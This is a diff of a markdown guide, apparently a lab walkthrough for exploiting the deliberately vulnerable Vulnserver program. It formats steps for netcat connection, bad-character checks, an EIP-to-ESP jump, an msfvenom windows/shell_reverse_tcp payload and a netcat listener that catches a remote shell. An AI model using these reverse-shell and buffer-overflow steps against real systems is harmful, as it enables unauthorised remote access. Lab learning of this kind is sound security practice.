@@ -713,7 +713,10 @@ It’s basically a wrapper around the OpenAI API.
   - in windows run vulnserver.exe as a administrator
   - run immune debugger as a administrator and attach vuln server to immune debugger and run this
   - sudo su and cd for root directory
-  - nc -nv <target ip> <target port> (this command is used to make connection between host mechine and target server)
+  ```console
+   //this command is used to make connection between host mechine and target server
+    nc -nv <target ip> <target port> 
+  ```  
     - nc = netcat 
     - -n = don't resolve the DNS 
     - -v = verbos   
@@ -796,8 +799,10 @@ It’s basically a wrapper around the OpenAI API.
   - Fifth step is identify bad characters(because they may cause issues in the shellcode):
     - bad char might be stop our payloads also     
     - run as administrator for vuln server and immunity debugger 
-    - chmod -x badchars.py
-    - ./badchars.py
+  ```console  
+      chmod -x badchars.py
+      ./badchars.py
+  ```    
     - In Immunity Debugger, click on the ESP register value -->right click on ESP and Follow in Dump option
     - ofter this there is not bad charectors
   
@@ -825,8 +830,10 @@ It’s basically a wrapper around the OpenAI API.
   - Eigth step is jump usng jump.py
     - we can use this for jump from EIP to ESP
     - EIP register has been overwritten with the return address of the vulnerable module
-    - chmod +x jump.py
-    - ./jump.py
+  ```console
+      chmod +x jump.py
+      ./jump.py
+  ```
 
   - Nighth Step is shell code method using shell code method:
    - first we have to create shell code using msfvenom(metasploit)
@@ -834,11 +841,13 @@ It’s basically a wrapper around the OpenAI API.
    - msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
   ```
    - copy that shell code and paste that code into the shellcode.py
-   - pluma shellcode.py
-   - we will run the Netcat command to listen on port in another terminal
-   - nc -nvlp <host_port>
-   - chmod +x shellcode.py (in first terminal)
-   - ./shellcode.py
+  ```console 
+      pluma shellcode.py
+     //we will run the Netcat command to listen on port in another terminal
+      nc -nvlp <host_port>
+      chmod +x shellcode.py (in first terminal)
+      ./shellcode.py
+  ```       
    - in listening port terminal shell access to the target vulnerable server has been established
 </detals>
 
